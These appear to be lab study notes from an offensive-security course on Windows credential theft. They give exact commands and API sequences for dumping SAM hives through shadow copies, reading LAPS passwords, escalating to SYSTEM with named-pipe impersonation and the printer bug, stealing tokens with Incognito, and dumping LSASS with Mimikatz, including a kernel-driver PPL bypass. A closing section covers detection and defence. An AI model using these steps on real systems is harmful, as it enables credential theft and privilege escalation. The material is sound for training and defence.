Objective

Understand Windows local/domain credential storage and post-authentication authorization (SAM, access tokens, Kerberos) and practice the attack chain: dump SAM via shadow copy, abuse LAPS delegation, escalate Network Service → SYSTEM via named-pipe impersonation (printer bug), ride delegation tokens with Incognito, and dump LSASS with Mimikatz — including PPL bypass and offline minidump parsing.

Target surface

  • Windows 10 client (local admin offsec.corp1), Windows Server 2019 appsrv01.corp1.com, domain corp1.com (DC01). Users: offsec, admin, jeff. Kali: 192.168.119.120.
  • Key locations: SAM at C:\Windows\System32\config\SAM (+ SYSTEM), registry hives HKLM\sam / HKLM\system, LSASS memory.

Techniques

1. SAM database dumping

  • Local creds are NTLM hashes (MD4-based) in the SAM; hash reuse across machines works when accounts share a password — the built-in Administrator (RID 500) is the classic target (enabled on servers by default, often re-enabled + shared password on desktops).
  • Find the local admin SID via WMI: powershell PS C:\> [wmi] "Win32_userAccount.Domain='client',Name='Administrator'" SID : S-1-5-21-1673717583-1524682655-2710527411-500
  • SAM is locked by SYSTEM; direct copy fails. Two working methods:
  • Volume shadow copy via WMIC (the vssadmin create shadow option is server-edition-only): C:\> wmic shadowcopy call create Volume='C:\' C:\> vssadmin list shadows # note \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1 C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system (Run from cmd.exe, not PowerShell.)
  • Registry hives (admin required): C:\> reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam C:\> reg save HKLM\system C:\users\offsec.corp1\Downloads\system
  • SAM hashes are encrypted with RC4 (pre-1607) or AES (1607+); keys live in SYSTEM. Decrypt with Creddump7 (or Mimikatz): kali@kali:~/creddump7$ python pwdump.py /home/kali/system /home/kali/sam Administrator:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::

2. Hardened local admin: GPP history & LAPS

  • Group Policy Preferences cpassword in SYSVOL XML was AES-256 "encrypted" with Microsoft's published private key (Get-GPPPassword) — MS14-025 removed creation but legacy files persist; still worth checking SYSVOL.
  • LAPS (2015): randomizes local admin password, stores cleartext in AD computer attributes ms-mcs-AdmPwd (+ ms-mcs-AdmPwdExpirationTime); reading requires explicit (confidential) permission.
  • LAPSToolkit workflow (needs powershell -exec bypass): powershell PS C:\Tools> Import-Module .\LAPSToolkit.ps1 PS C:\Tools> Get-LAPSComputers # appsrv01.corp1.com, password empty without read rights PS C:\Tools> Find-LAPSDelegatedGroups # corp1\LAPS Password Readers PS C:\Tools> Get-NetGroupMember -GroupName "LAPS Password Readers" # jeff, admin Authenticate as a delegated user (admin here) → Get-LAPSComputers returns the cleartext password ([REDACTED]) for appsrv01 — reusable wherever that local admin password matches.

3. Access token theory (what matters operationally)

  • Four integrity levels: low / medium / high / system; processes can't touch higher-integrity processes. Admins hold two tokens (UAC split-token); medium by default, high on "Run as administrator".
  • Privileges in the token: whoami /priv shows present vs enabled; AdjustTokenPrivileges enables present-but-disabled privileges at runtime; LsaAddAccountRights/secpol.msc adds privileges effective at next logon.
  • Impersonation tokens (Anonymous/Identification/Impersonation/Delegation) let a process act as another user; Delegation enables multi-machine hop (web server → DB).

4. Elevation via SeImpersonatePrivilege — named pipes + printer bug

  • SeImpersonatePrivilege ships on Network Service, Local Service, and default IIS accounts — so any unprivileged-service foothold is a SYSTEM escalation candidate. Mechanics: DuplicateTokenEx to mint a primary token from an impersonation token, CreateProcessWithTokenW to run as the impersonated user.
  • Pipe-server PoC (C#, P/Invoke): CreateNamedPipe(pipeName, 3 /*DUPLEX*/, 0 /*BYTE|WAIT*/, 10, 0x1000, 0x1000, 0, IntPtr.Zero) → ConnectNamedPipe (blocking) → ImpersonateNamedPipeClient(hPipe) → verify with OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken) + GetTokenInformation(hToken, 1, ...) (two-call sizing pattern, buffer via Marshal.AllocHGlobal) → ConvertSidToStringSid to print who connected.
  • Demo: run as Network Service (psexec64 -i -u "NT AUTHORITY\Network Service" cmd.exe), start the pipe server, then from an elevated prompt echo hello > \\localhost\pipe\test — the PoC prints the connecting SID (domain admin RID 500 in the course run).
  • Printer bug (Lee Christensen, SpoolSample): MS-RPRN's RpcOpenPrinter + RpcRemoteFindFirstPrinterChangeNotification force the SYSTEM print spooler to connect back to a "capture server" pipe. Locally, the spooler validates the capture path against its own \pipe\spoolss — workaround (found by @jonaslyk): a forward slash in the capture name survives validation then path-normalizes into your pipe name. C:\Tools> PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss # our pipe server C:\Tools> SpoolSample.exe appsrv01 appsrv01/pipe/test # triggers callback → Found sid S-1-5-18 # SYSTEM Final step in the full PoC: OpenThreadToken → DuplicateTokenEx(..., 2 /SecurityImpersonation/, 1 /TokenPrimary/, out hSystemToken) → CreateProcessWithTokenW(hSystemToken, 0, null, "C:\Windows\System32\cmd.exe", ...) → SYSTEM cmd (verified whoami /user = nt authority\system, S-1-5-18).
  • Context: works on Server 2019 / current Win10. Related tools/lineage: Juicy Potato (blocked 1809+), RoguePotato, RpcSs token theft (faxhell, Network Service only), and the WinRM-based "beans" local MITM (clients by default).

5. Incognito — riding existing tokens

  • With a SYSTEM Meterpreter shell: load incognito → list_tokens -u shows delegation tokens for logged-in users (course run: corp1\admin, IIS/service accounts, SYSTEM).
  • impersonate_token corp1\\admin (double backslash in Meterpreter) → getuid = corp1\admin. Diskless, no hashes needed; evades some detection that keys on Mimikatz.

6. Kerberos 101 (attack-relevant summary)

  • AS_REQ (timestamp encrypted with user-hash-derived key) → AS_REP (session key + TGT, TGT sealed with the KDC's secret; valid 10 h, renewable) → TGS_REQ (TGT + SPN + timestamp under session key) → TGS_REP (SPN + service session key + service ticket; the service ticket is encrypted with the service account's password hash) → AP_REQ to the service.
  • Consequence: cached TGTs/service tickets and hence password material sit in LSASS — the reason Mimikatz works.

7. Mimikatz: dump, bypass LSA PPL

  • Elevated prompt: privilege::debug (enables SeDebugPrivilege) → sekurlsa::logonpasswords dumps NTLM/SHA1/DPAPI per logon session (wdigest would show cleartext only if UseLogonCredential=1 under HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest — disabled by default 8.1+).
  • On appsrv01, LSA runs as Protected Process Light (RunAsPPL=1 under HKLM\SYSTEM\CurrentControlSet\Control\Lsa) → sekurlsa::logonpasswords fails with 0x00000005 (access denied) even as admin.
  • Bypass: Mimikatz's signed mimidrv.sys kernel driver — !+ to register/start it, then !processprotect /process:lsass.exe /remove clears the PPL bit in the EPROCESS object; re-run sekurlsa::logonpasswords and pull the domain admin's NTLM hash ([REDACTED]). Caveat: uploading mimidrv.sys is AV-bait.

8. Offline credential processing (AV-aware)

  • Dump LSASS without running tooling on the target: Task Manager → Details → lsass.exe → Create dump file (GUI only), or SysInternals ProcDump (signatured), or roll your own C# calling MiniDumpWriteDump (dbghelp.dll) with OpenProcess(0x001F0FFF, false, lsass_pid) and DumpType = 2 (MiniDumpWithFullMemory); find the PID via Process.GetProcessesByName("lsass")[0].Id; write via FileStream + SafeFileHandle.DangerousGetHandle(); run from an elevated prompt (course drop location: C:\Windows\Tasks).
  • Parse elsewhere with matching OS/arch: sekurlsa::minidump lsass.dmp then sekurlsa::logonpasswords — no elevation, no privilege::debug needed on the parsing machine. Mimikatz never touches the victim.

Detection & defense

  • Credential dumping prerequisites are loud: debug/impersonate privileges in odd contexts, shadow-copy creation (wmic shadowcopy call create), reg save of HKLM\sam/system, and handles opened to lsass.exe — alert on all four.
  • RID 500 hygiene: unique per-machine local admin passwords (LAPS, enforced rotation, tight ms-mcs-AdmPwd ACLs; audit "password reader" groups) or the local-admin compromise becomes domain-wide via hash reuse.
  • SeImpersonatePrivilege on service accounts is by-design but converts any web/service RCE into SYSTEM; where feasible run services with fewer rights, and monitor SpoolSample-style MS-RPRN callbacks to unexpected pipes (the forward-slash normalization trick defeats naive path filtering — validate canonicalized paths).
  • LSASS PPL + Credential Guard raise the bar but kernel-driver loads (mimidrv) remain the bypass — block/driver-blocklist unsigned or known-bad drivers, and treat any !processprotect equivalent as critical.
  • Minidump-based offline attacks defeat on-host AV: detect the dump creation (lsass access by TaskManager/procdump/custom callers, MiniDumpWriteDump invocation, 49 MB+ files in Tasks-style directories) rather than scanner signatures.

  • Token theory drill: whoami /priv under both a regular and an elevated prompt.
  • Combine the C# pipe-impersonation snippets; turn the resulting SYSTEM shell into Meterpreter/Covenant/Empire; retry the attack from Local Service.
